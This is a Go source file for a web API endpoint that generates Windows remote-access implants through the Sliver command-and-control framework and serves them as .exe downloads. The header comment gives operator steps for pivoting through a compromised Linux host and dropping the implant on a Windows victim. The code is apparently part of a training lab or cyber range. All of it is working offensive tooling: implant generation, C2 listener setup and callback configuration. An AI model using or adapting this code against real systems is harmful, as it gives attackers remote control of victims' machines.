package api

// implant_windows.go — GET /api/v1/implant/windows
//
// Windows counterpart to handleGetImplantLinux (implant.go). Compiles (or
// reuses) a Windows session implant via Sliver's Generate RPC and serves it as
// a .exe. Mirrors the Linux handler's caching and listener behaviour.
//
// IMPORTANT (topology): win_target has NO route to the C2 in this lab. You will
// normally NOT call this endpoint from the Windows victim directly. Instead:
//   1. Get a session on linux_pivot.
//   2. Start a SOCKS5 proxy or port-forward through the pivot.
//   3. Fetch the implant here (from the operator / pivot side) and drop it onto
//      win_target through the pivot.
// See SETUP.md "Deploying the Windows implant".
//
// Query parameters (all optional):
//   arch   amd64 (default) | 386
//   c2     C2 host the beacon calls back to (default: C2_HOST env or the
//          server's configured c2Host)
//   port   HTTP listener port (default: 80)
//
// Build note: Windows implant compilation requires the Sliver Windows
// cross-compile toolchain (shipped via `sliver-server unpack`). The FIRST
// Windows build downloads/extracts extra assets and can take 2–3 minutes.

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
)

// handleGetImplantWindows serves a generated Windows session binary (.exe).
func (s *Server) handleGetImplantWindows(w http.ResponseWriter, r *http.Request) {
	arch := r.URL.Query().Get("arch")
	if arch == "" {
		arch = "amd64"
	}
	c2Host := r.URL.Query().Get("c2")
	if c2Host == "" {
		c2Host = s.c2Host
	}
	portStr := r.URL.Query().Get("port")
	port := defaultListenerPort
	if portStr != "" {
		if p, err := strconv.ParseUint(portStr, 10, 32); err == nil {
			port = uint32(p)
		}
	}

	c2URL := fmt.Sprintf("http://%s:%d", c2Host, port)
	cacheKey := fmt.Sprintf("windows_%s_%s_%d", arch, c2Host, port)

	globalImplantCache.mu.Lock()
	if data, ok := globalImplantCache.cache[cacheKey]; ok {
		globalImplantCache.mu.Unlock()
		serveImplant(w, data, "sliver-session-windows-"+arch+".exe")
		return
	}
	globalImplantCache.mu.Unlock()

	// The HTTP listener the beacon calls back to is OS-agnostic — one listener
	// serves both Linux and Windows implants pointed at the same c2URL.
	if err := s.ensureHTTPListener(c2Host, port); err != nil {
		log.Printf("[implant] ensureHTTPListener: %v", err)
		writeError(w, http.StatusInternalServerError, "could not start HTTP listener: "+err.Error())
		return
	}

	// Reuse an existing Windows build if one matches (avoids recompilation).
	var data []byte
	if buildName, err := s.findMatchingBuildOS("windows", arch, c2URL); err == nil && buildName != "" {
		log.Printf("[implant] Reusing existing Windows build: %s", buildName)
		ctx, cancel := context.WithTimeout(r.Context(), 2*time.Minute)
		defer cancel()
		regen, err := s.rpc.Regenerate(ctx, &clientpb.RegenerateReq{ImplantName: buildName})
		if err == nil && regen.File != nil && len(regen.File.Data) > 0 {
			data = regen.File.Data
		}
	}

	if data == nil {
		log.Printf("[implant] Compiling windows/%s session implant → %s (first Windows build can take 2-3 min)…", arch, c2URL)
		ctx, cancel := context.WithTimeout(r.Context(), buildTimeout)
		defer cancel()

		resp, err := s.rpc.Generate(ctx, &clientpb.GenerateReq{
			Config: &clientpb.ImplantConfig{
				GOOS:             "windows",
				GOARCH:           arch,
				Format:           clientpb.OutputFormat_EXECUTABLE,
				IsBeacon:         false,
				HTTPC2ConfigName: "default",
				C2: []*clientpb.ImplantC2{
					{Priority: 0, URL: c2URL},
				},
			},
		})
		if err != nil {
			log.Printf("[implant] Windows Generate RPC error: %v", err)
			writeError(w, http.StatusInternalServerError, "windows implant generation failed: "+err.Error())
			return
		}
		if resp.File == nil || len(resp.File.Data) == 0 {
			writeError(w, http.StatusInternalServerError, "windows implant generation returned empty binary")
			return
		}
		data = resp.File.Data
		log.Printf("[implant] Compiled windows/%s session implant (%d bytes)", arch, len(data))
	}

	globalImplantCache.mu.Lock()
	globalImplantCache.cache[cacheKey] = data
	globalImplantCache.mu.Unlock()

	serveImplant(w, data, "sliver-session-windows-"+arch+".exe")
}

// findMatchingBuildOS is an OS-parameterized version of findMatchingBuild
// (implant.go). It returns the name of an existing ImplantBuild matching the
// given GOOS, arch and C2 URL, or "" if none is found.
func (s *Server) findMatchingBuildOS(goos, arch, c2URL string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	builds, err := s.rpc.ImplantBuilds(ctx, &commonpb.Empty{})
	if err != nil {
		return "", err
	}
	for name, cfg := range builds.GetConfigs() {
		if cfg.GetGOOS() != goos || cfg.GetGOARCH() != arch {
			continue
		}
		for _, c2 := range cfg.GetC2() {
			if strings.EqualFold(c2.GetURL(), c2URL) {
				return name, nil
			}
		}
	}
	return "", nil
}
